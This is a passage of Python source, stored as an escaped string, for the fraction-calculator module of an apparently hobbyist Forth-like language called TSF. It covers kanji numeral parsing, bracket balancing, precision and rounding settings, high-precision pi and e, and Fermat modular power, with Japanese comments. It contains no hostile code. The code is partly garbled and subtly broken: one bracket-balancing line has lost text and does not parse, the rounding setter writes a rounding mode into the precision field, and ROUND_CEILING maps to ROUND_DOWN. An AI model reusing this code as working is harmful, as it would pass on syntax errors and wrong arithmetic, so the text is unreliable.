TSF_words[\"#\u5c0f\u6570\u8a08\u7b97\"]=TSF_calc_calcDC\n    TSF_words[\"#TSF_calcDCQQ\"]=TSF_calc_calcDCQQ; TSF_words[\"#\u5c0f\u6570\u4e5d\u4e5d\"]=TSF_calc_calcDCQQ\n    TSF_words[\"#TSF_calcKN\"]=TSF_calc_calcKN; TSF_words[\"#\u5358\u4f4d\u8a08\u7b97\"]=TSF_calc_calcKN\n    TSF_words[\"#TSF_calcKNQQ\"]=TSF_calc_calcKNQQ; TSF_words[\"#\u5358\u4f4d\u4e5d\u4e5d\"]=TSF_calc_calcKNQQ\n    TSF_words[\"#TSF_calcPR\"]=TSF_calc_calcPR; TSF_words[\"#\u6709\u52b9\u6841\u6570\"]=TSF_calc_calcPR\n    TSF_words[\"#TSF_calcRO\"]=TSF_calc_calcRO; TSF_words[\"#\u7aef\u6570\u51e6\u7406\"]=TSF_calc_calcRO\n    return TSF_words\n\ndef TSF_calc_calcbrackets(TSF_tsvBL,TSF_tsvBR):   #TSF_doc:\u62ec\u5f27\u3067\u30b9\u30bf\u30c3\u30af\u3092\u9023\u7d50\u3059\u308b\u3002\n    TSF_tsvA=TSF_Forth_popthat()\n    for TSF_stacksK,TSF_stacksV in TSF_Forth_stacksitems():\n        TSF_calcK=\"\".join([TSF_tsvBL,TSF_stacksK])\n        if TSF_calcK in TSF_tsvA:\n            for TSF_stackC,TSF_stackQ in enumerate(TSF_stacksV):\n                TSF_calcK=\"\".join([TSF_tsvBL,TSF_stacksK,str(TSF_stackC),TSF_tsvBR])\n                if TSF_calcK in TSF_tsvA:\n                    TSF_tsvA=TSF_tsvA.replace(TSF_calcK,TSF_stackQ)\n    for TSF_stackC in range(TSF_Forth_stackslen()):\n        TSF_calcK=\"\".join([TSF_tsvBL,str(TSF_stackC),TSF_tsvBR])\n        if TSF_calcK in TSF_tsvA:\n            TSF_tsvA=TSF_tsvA.replace(TSF_calcK,TSF_Forth_popthat())\n        else:\n            break\n    return TSF_tsvA\n\ndef TSF_calc_brackets():   #TSF_doc:[stackN\u2026stackB,stackA,count,calc,brackets]\u3053\u308c\u81ea\u4f53\u306f\u8a08\u7b97\u306f\u305b\u305a\u3001\u4efb\u610f\u306e\u62ec\u5f27\u306b\u56f2\u307e\u308c\u305f\u30b9\u30bf\u30c3\u30af\u756a\u53f7\u3092\u30b9\u30bf\u30c3\u30af\u5185\u5bb9\u306b\u7f6e\u63db\u3002brackets\u3068calc\u81ea\u8eab\u3068calc\u5185\u306e\u8a72\u5f53\u62ec\u5f27\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u3002\n    TSF_tsvB=TSF_Forth_popthat()\n    if len(TSF_tsvB) < 2: TSF_tsvB=\"[]\"\n    TSF_tsvBL,TSF_tsvBR=TSF_tsvB[0],TSF_tsvB[-1]\n    TSF_Forth_pushthat(TSF_calc_calcbrackets(TSF_tsvBL,TSF_tsvBR))\n    return None\n\ndef TSF_calc_calcFX():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3059\u308b\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),None))\n    return None\n\ndef TSF_calc_calcFXQQ():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3059\u308b(\u6697\u8a18\u3082\u3059\u308b)\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),True))\n    return None\n\ndef TSF_calc_calcDC():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3057\u3066\u7d50\u679c\u3092\u5c0f\u6570\u307e\u305f\u306f\u6574\u6570\u3067\u8868\u793a\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc_decimalizeDC(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),None)))\n    return None\n\ndef TSF_calc_calcDCQQ():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3057\u3066\u7d50\u679c\u3092\u5c0f\u6570\u307e\u305f\u306f\u6574\u6570\u3067\u8868\u793a(\u6697\u8a18\u3082\u3059\u308b)\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc_decimalizeDC(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),True)))\n    return None\n\ndef TSF_calc_calcKN():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3057\u3066\u7d50\u679c\u3092\u6f22\u6570\u5b57\u3092\u6df7\u305c\u3066\u3067\u8868\u793a\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc_decimalizeKN(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),None)))\n    return None\n\ndef TSF_calc_calcKNQQ():   #TSF_doc:[calc]\u5206\u6570\u96fb\u5353\u3057\u3066\u7d50\u679c\u3092\u6f22\u6570\u5b57\u3092\u6df7\u305c\u3066\u3067\u8868\u793a(\u6697\u8a18\u3082\u3059\u308b)\u3002calc\u3068\u9023\u7d50\u5206\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0b\u308d\u3057\u30011\u30b9\u30bf\u30c3\u30af\u7a4d\u307f\u4e0a\u3052\u3002\n    TSF_Forth_pushthat(TSF_calc_decimalizeKN(TSF_calc(TSF_calc_calcbrackets(\"[\",\"]\"),True)))\n    return None\n\ndef TSF_calc_calcPR():   #TSF_doc:[prec]\u6709\u52b9\u6841\u6570\u3092\u5909\u66f4\u3059\u308b\u3002\u6841\u6570\u304c\u5909\u308f\u308b\u3068\u540c\u3058\u5f0f\u3067\u3082\u5024\u304c\u5909\u308f\u308b\u306e\u3067\u6697\u8a18(\u4e5d\u4e5d)\u3082\u521d\u671f\u5316\u3059\u308b\u3002\n    TSF_calc_precision(TSF_Forth_popintthe(TSF_Forth_stackthat()))\n    return None\n\ndef TSF_calc_calcRO():   #TSF_doc:[round]\u7aef\u6570\u51e6\u7406\u3092\u5909\u66f4\u3059\u308b\u3002\u7aef\u6570\u304c\u5909\u308f\u308b\u3068\u540c\u3058\u5f0f\u3067\u3082\u5024\u304c\u5909\u308f\u308b\u306e\u3067\u6697\u8a18(\u4e5d\u4e5d)\u3082\u521d\u671f\u5316\u3059\u308b\u3002\n    TSF_calc_rounding(TSF_Forth_popintthe(TSF_Forth_stackthat()))\n    return None\n\n\nTSF_calc_opewide=\"f1234567890.pm!|$ELRSsCcTtyYen+-*/\\\\#%(MPFZzOoUuN~k)&GglAa^><\" \\\n                \"\u92ad\u5341\u767e\u5343\u4e07\u5104\u5146\u4eac\u5793\ud855\udf71\u7a63\u6e9d\u6f97\u6b63\u8f09\u6975\u6052\u963f\u90a3\u601d\u91cf\" \\\n                \"\uff11\uff12\uff13\uff14\uff15\uff16\uff17\uff18\uff19\uff10\uff5c\uff0e\" \"\u7d76\u8ca0\u5206\u70b9\u5186\u5713\" \"\u4e00\u4e8c\u4e09\u56db\u4e94\u516d\u4e03\u516b\u4e5d\u3007\" \"\u58f1\u5f10\u53c2\u8086\u4f0d\u9678\u6f06\u634c\u7396\u96f6\" \\\n                \"\uff0b\uff0d\u00d7\u00f7\uff0f\uff3c\uff03\uff05\" \"\u52a0\u6e1b\u4e57\u9664\u6bd4\u7a0e\" \"\u8db3\u5f15\u639b\u5272\" \"\u548c\u5dee\u7a4d\u5546\" \"\u964c\u9621\u842c\u4ed9\u79ed\" \\\n                \"\uff08\uff09()\uff5b\uff5d{}\uff3b\uff3d[]\u300c\u300d\uff62\uff63\u300e\u300f\u03a3\u4f46\u203b\u5217\u03a0\u56f2\uff5e\u301c\u5024\u3068\u3092\u7d04\u500d\" \\\n                \"\u4e57\u5e38\u9032\u5bfe\u221a\u6839\u03c0\u5468\u03b8\uff45\u5e95\u221e\u7121\u6841\"\nTSF_calc_opehalf=\"f1234567890.pm!|$ELRSsCcTtyYen+-*/\\\\#%(MPFZzOoUuN~k)&GglAa^><\" \\\n                \"\u92ad\u5341\u767e\u5343\u4e07\u5104\u5146\u4eac\u5793\ud855\udf71\u7a63\u6e9d\u6f97\u6b63\u8f09\u6975\u6052\u963f\u90a3\u601d\u91cf\" \\\n                \"1234567890|.\" \"!m$...\" \"1234567890\" \"1234567890\" \\\n                \"+-*//\\\\#%\" \"+-*/%%\" \"+-*/\" \"+-*/\" \"\u767e\u5343\u4e07\u92ad\ud855\udf71\" \\\n                \"()()()()()()()()()MMMMP~~~k&&Gg\" \\\n                \"^LlERRyyYeennf\"\nTSF_calc_operator=OrderedDict(zip(list(TSF_calc_opewide),list(TSF_calc_opehalf)))\nTSF_calc_opelong=[\"\u6052\u6cb3\u6c99\",\"\u963f\u50e7\u7947\",\"\u90a3\u7531\u4ed6\",\"\u4e0d\u53ef\u601d\u8b70\",\"\u7121\u91cf\u5927\u6570\",\"\u7121\u9650\",\"\u5206\u306e\",\"\u5186\u5468\u7387\",\"2\u03c0\",\"\uff12\u03c0\",\"\u30cd\u30a4\u30d4\u30a2\u6570\",\"\u30d7\u30e9\u30b9\",\"\u30de\u30a4\u30ca\u30b9\",\"\u6c37\u70b9\u4e0b\",\"\u5c0f\u6570\u70b9\", \\\n                \"\u6700\u5927\u516c\u7d04\u6570\",\"\u6700\u5c0f\u516c\u500d\u6570\",\"\u516c\u7d04\u6570\",\"\u516c\u500d\u6570\",\"\u3068\u3093\u3067\",\"\u3068\u3070\u3057\u3066\",\"\u3068\u3076\u3053\u3068\u306e\",\"\u5e73\u65b9\u6839\",\"\u5e38\u7528\u5bfe\u6570\",\"\u9032\u5bfe\u6570\",\"\u81ea\u7136\u5bfe\u6570\",\"\u7d76\u5bfe\u5024\", \\\n                \"sin\",\"cos\",\"tan\"]\nTSF_calc_opelshort=[\"\u6052\",\"\u963f\",\"\u90a3\",\"\u601d\",\"\u91cf\",\"\u221e\",\"$\",\"\u03c0\",\"\u03b8\",\"\u03b8\",\"\uff45\",\"p\",\"m\",\"\u70b9\",\"\u70b9\",\"\u7d76\", \\\n                \"\u7d04\",\"\u500d\",\"\u7d04\",\"\u500d\",\"\",\"\",\"\",\"\u6839\",\"\u5e38\",\"\u9032\",\"\u5bfe\", \\\n                \"S\",\"C\",\"T\"]\nTSF_calc_opeword=dict(zip(TSF_calc_opelong,TSF_calc_opelshort))\nTSF_calc_opemarkC=[\"*+\",\"*-\",\"/+\",\"/-\",\"#+\",\"#-\",\"|+\",\"|-\",\"++\",\"+-\",\"-+\",\"--\",\n                \"0k\", \"1k\", \"2k\", \"3k\", \"4k\", \"5k\", \"6k\", \"7k\", \"8k\", \"9k\", \".k\",\n                \"0(\", \"1(\", \"2(\", \"3(\", \"4(\", \"5(\", \"6(\", \"7(\", \"8(\", \"9(\", \".(\",\n                \")0\", \")1\", \")2\", \")3\", \")4\", \")5\", \")6\", \")7\", \")8\", \")9\", \").\",\n                \")(\", \"|(\", \"+$\"]\nTSF_calc_opemarkP=[\"*p\",\"*m\",\"/p\",\"/m\",\"#p\",\"#m\",\"|p\",\"|m\",\"+p\",\"+m\",\"-p\",\"-m\",\n                \"0*k\",\"1*k\",\"2*k\",\"3*k\",\"4*k\",\"5*k\",\"6*k\",\"7*k\",\"8*k\",\"9*k\",\".*k\",\n                \"0*(\",\"1*(\",\"2*(\",\"3*(\",\"4*(\",\"5*(\",\"6*(\",\"7*(\",\"8*(\",\"9*(\",\".*(\",\n                \")*0\",\")*1\",\")*2\",\")*3\",\")4*\",\")*5\",\")*6\",\")*7\",\")*8\",\")*9\",\")*.\",\n                \")*(\", \"/(\", \"$\"]\nTSF_calc_opemark=dict(zip(TSF_calc_opemarkC,TSF_calc_opemarkP))\nTSF_calc_okusenman=\"\u4e07\u5104\u5146\u4eac\u5793\ud855\udf71\u7a63\u6e9d\u6f97\u6b63\u8f09\u6975\u6052\u963f\u90a3\u601d\u91cf\"\nTSF_calc_okusenzero=['1'+'0'*((o+1)*4) for o in range(len(TSF_calc_okusenman))]\nTSF_calc_okusendic=dict(zip(list(TSF_calc_okusenman),TSF_calc_okusenzero))\nTSF_calc_precisionMAX=72; decimal.getcontext().prec=TSF_calc_precisionMAX\nTSF_calc_precisionPI=TSF_calc_precisionMAX-4;\nTSF_calc_precisionROUND=decimal.ROUND_DOWN; decimal.getcontext().rounding=TSF_calc_precisionROUND\nTSF_calc_PI=\"31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679\"\nTSF_calc_PI2=\"62831853071795864769252867665590057683943387987502116419498891846156328125724179972560696506842341359\"\nTSF_calc_E=\"27182818284590452353602874713526624977572470936999595749669676277240766303535475945713821785251664274\"\n\ndef TSF_calc_precision(TSF_prec):    #TSF_doc:\u96fb\u5353\u306e\u6709\u52b9\u6841\u6570\u3092\u5909\u66f4\u3059\u308b\u3002\u521d\u671f\u5024\u306f72\u6841(\u5343\u7121\u91cf\u5927\u6570)\u3002\u5186\u5468\u7387\u3068\u30cd\u30a4\u30d4\u30a2\u6570\u30824\u6841\u63a7\u3048\u3066\u518d\u8a08\u7b97\u3059\u308b\u3002\n    global TSF_calc_precisionMAX,TSF_calc_precisionPI,TSF_calcQQmemory\n    TSF_calc_precisionMAX=min(max(TSF_prec,5),1000); TSF_calc_precisionPI=TSF_calc_precisionMAX-4\n    decimal.getcontext().prec=TSF_calc_precisionMAX*2\n    TSF_PI_A,TSF_PI_B,TSF_PI_T,TSF_PI_C=decimal.Decimal(1),decimal.Decimal(1)/decimal.Decimal(2).sqrt(),decimal.Decimal(1)/decimal.Decimal(4),decimal.Decimal(1)\n    for TSF_PI_X in range(int(math.ceil(math.log(TSF_calc_precisionPI,2)))):\n       TSF_PI_AB=decimal.Decimal(TSF_PI_A+TSF_PI_B)/decimal.Decimal(2)\n       TSF_PI_B=decimal.getcontext().sqrt(TSF_PI_A*TSF_PI_B)\n       TSF_PI_T-=decimal.Decimal(TSF_PI_C)*decimal.getcontext().power(TSF_PI_A-TSF_PI_AB,2)\n       TSF_PI_A=TSF_PI_AB; TSF_PI_C*=2\n    TSF_PI_P2=decimal.getcontext().power(TSF_PI_A+TSF_PI_B,2)/TSF_PI_T/decimal.Decimal(2)\n    TSF_calc_PI2=str(TSF_PI_P2).replace('.',''); TSF_calc_PI=str(TSF_PI_P2/decimal.Decimal(2)).replace('.','')\n    TSF_PI_E,TSF_PI_K=decimal.Decimal(1),decimal.Decimal(1)\n    for TSF_PI_X in range(TSF_calc_precisionPI):\n        TSF_PI_K*=decimal.Decimal(TSF_PI_X+1)\n        TSF_PI_E+=decimal.Decimal(1)/TSF_PI_K\n    TSF_calc_E=str(TSF_PI_E).replace('.','')\n    decimal.getcontext().prec=TSF_calc_precisionMAX\n    TSF_calcQQmemory={}\n\nTSF_calc_roundopt={\n    \"ROUND_DOWN\":decimal.ROUND_DOWN,  \"\u30bc\u30ed\u65b9\u5411\u306b\u4e38\u3081\u308b\":decimal.ROUND_DOWN,  \"\u30bc\u30ed\u65b9\u5411\u306b\u5207\u308a\u6368\u3066\u308b\":decimal.ROUND_DOWN,\n    \"ROUND_UP\":decimal.ROUND_UP,  \"\u30bc\u30ed\u304b\u3089\u9060\u3056\u304b\u308b\u65b9\u306b\u4e38\u3081\u308b\":decimal.ROUND_UP,   \"\u30bc\u30ed\u304b\u3089\u9060\u3056\u304b\u308b\u69d8\u306b\u5207\u308a\u4e0a\u3052\u308b\":decimal.ROUND_UP,\n    \"ROUND_FLOOR\":decimal.ROUND_FLOOR,  \"\u30de\u30a4\u30ca\u30b9\u7121\u9650\u65b9\u5411\u306b\u4e38\u3081\u308b\":decimal.ROUND_FLOOR,  \"\u30de\u30a4\u30ca\u30b9\u7121\u9650\u65b9\u5411\u306b\u5207\u308a\u6368\u3066\u308b\":decimal.ROUND_FLOOR,\n    \"ROUND_CEILING\":decimal.ROUND_DOWN,  \"\u30d7\u30e9\u30b9\u7121\u9650\u65b9\u5411\u306b\u4e38\u3081\u308b\":decimal.ROUND_DOWN,  \"\u30d7\u30e9\u30b9\u7121\u9650\u65b9\u5411\u306b\u5207\u308a\u4e0a\u3052\u308b\":decimal.ROUND_DOWN,\n    \"ROUND_HALF_UP\":decimal.ROUND_HALF_UP,  \"\u56db\u6368\u4e94\u5165\u3059\u308b\":decimal.ROUND_HALF_UP,\n    \"ROUND_HALF_DOWN\":decimal.ROUND_HALF_DOWN,  \"\u4e94\u6368\u4e94\u8d85\u5165\u3059\u308b\":decimal.ROUND_HALF_DOWN,  \"\u4e94\u6368\u516d\u5165\u3059\u308b\":decimal.ROUND_HALF_DOWN,\n    \"ROUND_HALF_EVEN\":decimal.ROUND_HALF_EVEN,  \"\u5076\u6368\u5947\u5165\u3059\u308b\":decimal.ROUND_HALF_EVEN,  \"\u9280\u884c\u4e38\u3081\u3059\u308b\":decimal.ROUND_HALF_EVEN,  \"ISO\u4e38\u3081\u3059\u308b\":decimal.ROUND_HALF_EVEN,\n    \"ROUND_05UP\":decimal.ROUND_05UP,  \"\u30bc\u30ed\u65b9\u5411\u306b\u5207\u308a\u6368\u3066\u305f\u7d50\u679c\u672b\u5c3e\u6841\u304c0\u304b5\u306b\u306a\u308b\u5834\u5408\u306f\u30bc\u30ed\u304b\u3089\u9060\u3056\u304b\u308b\u69d8\u306b\u5207\u308a\u4e0a\u3052\u308b\":decimal.ROUND_05UP,\n}\ndef TSF_calc_rounding(TSF_round):    #TSF_doc:\u96fb\u5353\u306e\u7aef\u6570\u51e6\u7406\u3092\u6307\u5b9a\u3002\u521d\u671f\u5024\u306fROUND_DOWN(\u30bc\u30ed\u65b9\u5411\u306b\u4e38\u3081\u308b)\n    global TSF_calc_precisionROUND,TSF_calcQQmemory\n    TSF_calc_precisionROUND=TSF_calc_roundopt.get(TSF_round,decimal.ROUND_DOWN)\n    decimal.getcontext().prec=TSF_calc_precisionROUND\n    TSF_calcQQmemory={}\n\ndef TSF_calc_bracketsbalance(TSF_calcQ):    #TSF_doc:\u62ec\u5f27\u306e\u30d0\u30e9\u30f3\u30b9\u3092\u6574\u3048\u308b\u3002\u3064\u3044\u3067\u306b\u7121\u52b9\u306a\u6f14\u7b97\u5b50\u3092\u9664\u53bb\u3057\u305f\u308a\u5186\u5468\u7387\u5104\u5343\u4e07\u306a\u3069\u8a08\u7b97\u306e\u4e0b\u6e96\u5099\u3002\n    TSF_calcA=\"\"; TSF_calcbracketLR,TSF_calcbracketCAP=0,0\n    for TSF_opewordK,TSF_opewordV in TSF_calc_opeword.items():\n        TSF_calcQ=TSF_calcQ.replace(TSF_opewordK,TSF_opewordV)\n    for TSF_calcbracketQ in TSF_calcQ:\n        TSF_calcA+=TSF_calc_operator.get(TSF_calcbracketQ,'')\n        if TSF_calcbracketQ == '(':\n            TSF_calcbracketLR+=1\n        if TSF_calcbracketQ == ')':\n            TSF_calcbracketLR-=1\n            if TSF_calcbracketLR 0:\n        TSF_calcA=TSF_calcA+')'*abs(TSF_calcbracketLR)\n    if TSF_calcbracketLR < 0:\n        TSF_calcA='('*abs(TSF_calcbracketLR)+TSF_calcA\n    TSF_calcA='('*abs(TSF_calcbracketCAP)+TSF_calcA+')'*abs(TSF_calcbracketCAP)\n    TSF_calcA=re.sub(re.compile(\"([0-9\u5343\u767e\u5341]+?)\u92ad\"),\"+(\\\\1)/100\",TSF_calcA)\n    for TSF_okusenK,TSF_okusenV in TSF_calc_okusendic.items():\n        TSF_calcA=re.sub(re.compile(\"\".join([\"([0-9\u5343\u767e\u5341]+?)\",TSF_okusenK])),\"\".join([\"(\\\\1)*\",TSF_okusenV,\"+\"]),TSF_calcA)\n    TSF_calcA=re.sub(re.compile(\"([0-9]+?)\u5343\"),\"(\\\\1*1000)+\",TSF_calcA)\n    TSF_calcA=re.sub(re.compile(\"([0-9]+?)\u767e\"),\"(\\\\1*100)+\",TSF_calcA)\n    TSF_calcA=re.sub(re.compile(\"([0-9]+?)\u5341\"),\"(\\\\1*10)+\",TSF_calcA)\n    TSF_calcA=TSF_calcA.replace('\u92ad',\"1|100+\")\n    TSF_calcA=TSF_calcA.replace('\u5341',\"10+\")\n    TSF_calcA=TSF_calcA.replace('\u767e',\"100+\")\n    TSF_calcA=TSF_calcA.replace('\u5343',\"1000+\")\n    for TSF_okusenK,TSF_okusenV in TSF_calc_okusendic.items():\n        TSF_calcA=TSF_calcA.replace(TSF_okusenK,\"\".join([TSF_okusenV,\"+\"]))\n    TSF_calcA=TSF_calcA.replace('y',\"\".join([TSF_calc_PI[:TSF_calc_precisionPI],\"|1\",'0'*(TSF_calc_precisionPI-1)]))\n    TSF_calcA=TSF_calcA.replace('Y',\"\".join([TSF_calc_PI2[:TSF_calc_precisionPI],\"|1\",'0'*(TSF_calc_precisionPI-1)]))\n    TSF_calcA=TSF_calcA.replace('e',\"\".join([TSF_calc_E[:TSF_calc_precisionPI],\"|1\",'0'*(TSF_calc_precisionPI-1)]))\n    TSF_calcA=TSF_calcA.replace('f',str(TSF_calc_precisionMAX)).replace('n','(n|0)')\n#    TSF_io_printlog(\"TSF_calc_bracketsbalance:{0}\".format(TSF_calcA))\n    for TSF_calc_opecase in TSF_calc_opemark:\n        if TSF_calc_opecase in TSF_calcA:\n            TSF_calcA=TSF_calcA.replace(TSF_calc_opecase,TSF_calc_opemark[TSF_calc_opecase])\n    return TSF_calcA\n\ndef TSF_calc(TSF_calcQ,TSF_calcQQ=None):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306emain\u3002\u62ec\u5f27\u306e\u5185\u5074\u3092\u691c\u7d22(\u6b63\u898f\u8868\u73fe)\u3002\n    global TSF_calcQQmemory\n    TSF_calcA=\"n|0\"\n    TSF_calcA=TSF_calc_bracketsbalance(TSF_calcQ);\n    TSF_calc_bracketreg=re.compile(\"[(](?<=[(])[^()]*(?=[)])[)]\")\n    while \"(\" in TSF_calcA:\n        for TSF_calcK in re.findall(TSF_calc_bracketreg,TSF_calcA):\n            TSF_calcA=TSF_calcA.replace(TSF_calcK,TSF_calc_referential(TSF_calcK,TSF_calcQQ))\n    TSF_calcA=TSF_calcA.replace(TSF_calcA,TSF_calc_referential(TSF_calcA,TSF_calcQQ))\n    return TSF_calcA\n\nTSF_calcQQmemory={}\ndef TSF_calc_referential(TSF_calcQ,TSF_calcQQ=None):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306e\u548c\u96c6\u5408\u7a4d\u96c6\u5408\u304a\u3088\u3073\u30bc\u30ed\u6bd4\u8f03\u6f14\u7b97\u5b50\u7cfb\u3002\n    global TSF_calcQQmemory\n    TSF_calcQ=TSF_calcQ.lstrip(\"(\").rstrip(\")\")\n    if TSF_calcQQ != None:\n        if TSF_calcQQ == True:\n            TSF_calcA=TSF_calcQ.replace(TSF_calcQ,TSF_calcQQmemory.get(TSF_calcQ,TSF_calc_function(TSF_calcQ))); TSF_calcQQmemory[TSF_calcQ]=TSF_calcA\n        else:\n            TSF_calcA=TSF_calcQ.replace(TSF_calcQ,TSF_calc_function(TSF_calcQ))\n    else:\n        TSF_calcA=TSF_calcQ.replace(TSF_calcQ,TSF_calcQQmemory.get(TSF_calcQ,TSF_calc_function(TSF_calcQ)))\n    return TSF_calcA\n\ndef TSF_calc_Fermatmodulo(TSF_calcSeq,TSF_pow,TSF_modulo):    #\u51aa\u4e57\u30e2\u30b8\u30e5\u30ed\u3002\u7d20\u6570\u306e\u30d5\u30a7\u30eb\u30de\u30fc\u30c6\u30b9\u30c8\u306a\u3069\u3067\u4f7f\u7528\u3002\n    try:\n        TSF_calcA=\"0\"\n        TSF_calcSeq=decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq))).to_integral_value()\n        TSF_pow=decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_pow))).to_integral_value()\n        TSF_modulo=decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_modulo))).to_integral_value()\n        TSF_calcA=str(decimal.getcontext().power(TSF_calcSeq,TSF_pow,TSF_modulo))\n    except decimal.InvalidOperation:\n        TSF_calcA=\"n|0\"\n    return TSF_calcA\n\nTSF_calc_NOZUs=OrderedDict([\n    ('N',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if TSF_calc_addition(TSF_calcSeq.replace('k',\"0\")) == \"n|0\" else TSF_LimRest)),\n    ('Z',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"NaN\")) == 0 else TSF_LimRest)),\n    ('z',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"NaN\")) != 0 else TSF_LimRest)),\n    ('O',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"-Infinity\")) >= 0 else TSF_LimRest)),\n    ('o',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"-Infinity\")) > 0 else TSF_LimRest)),\n    ('U',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"+Infinity\")) <= 0 else TSF_LimRest)),\n    ('u',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_LimFirst if decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\"))).replace(\"n|0\",\"+Infinity\")) < 0 else TSF_LimRest)),\n    ('M',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:\"+\".join([TSF_calc_addition(TSF_calcSeq.replace('k',str(TSF_LimK))) for TSF_LimK in TSF_calc_function_limit(TSF_LimFirst,TSF_LimRest)]))),\n    ('P',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:\"*\".join([TSF_calc_addition(TSF_calcSeq.replace('k',str(TSF_LimK))) for TSF_LimK in TSF_calc_function_limit(TSF_LimFirst,TSF_LimRest)]))),\n    ('F',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:TSF_calc_Fermatmodulo(TSF_calcSeq,TSF_LimFirst,TSF_LimRest) )),\n    ('$',(lambda TSF_calcSeq,TSF_LimFirst,TSF_LimRest:\"/\".join([str(TSF_calc_addition(TSF_LimFirst.replace('k',\"0\"))),str(TSF_calc_addition(TSF_calcSeq.replace('k',\"0\")))]))),\n])\n\ndef TSF_calc_function_limit(TSF_LimFirst,TSF_LimRest):    #TSF_doc:\u548c\u96c6\u5408\u7a4d\u96c6\u5408\u306erange\u4f5c\u6210\u3002\n    try:\n        TSF_LimStart,TSF_LimGoal=decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_LimFirst))).to_integral_value(),decimal.Decimal(TSF_calc_decimalizeDC(TSF_calc_addition(TSF_LimRest))).to_integral_value()\n        if TSF_LimStart <= TSF_LimGoal:\n            TSF_limstep=1; TSF_LimGoal+=1\n        else:\n            TSF_limstep=-1; TSF_LimGoal-=1\n        return range(TSF_LimStart,TSF_LimGoal,TSF_limstep)\n    except decimal.InvalidOperation:\n        TSF_LimStart,TSF_LimGoal,TSF_limstep=None,None,None\n        return range(0)\n\ndef TSF_calc_function(TSF_calcQ):    #TSF_doc:\u5206\u6570\u96fb\u5353\u306e\u548c\u96c6\u5408\u7a4d\u96c6\u5408\u304a\u3088\u3073\u30bc\u30ed\u6bd4\u8f03\u6f14\u7b97\u5b50\u7cfb\u3002\n    TSF_calcOfind=-1; TSF_calc_NOZUin=\"\"\n    for TSF_calc_NOZU in TSF_calc_NOZUs.keys():\n        if TSF_calc_NOZU in TSF_calcQ:\n            TSF_calc_NOZUin+=TSF_calc_NOZU\n            TSF_calcOfind=TSF_calcQ.find(TSF_calc_NOZUin)\n    if TSF_calcOfind >= 0:\n        TSF_calcQ='\\t'.join([TSF_calcQ[:TSF_calcOfind],TSF_calcQ[TSF_calcOfind+1:]])\n        for TSF_calc_NOZU in TSF_calc_NOZUin:\n            TSF_calcQ=TSF_calcQ.replace(TSF_calc_NOZU,'')\n        TSF_calc_NOZU=TSF_calc_NOZUin[-1]\n        TSF_calcSeq,TSF_calcLim=TSF_calcQ.split('\\t')\n        if not '~' in TSF_calcLim:\n            if TSF_calc_NOZU in \"MP\":\n                TSF_calcLim=\"~\".join([\"1\",TSF_calcLim])\n            elif 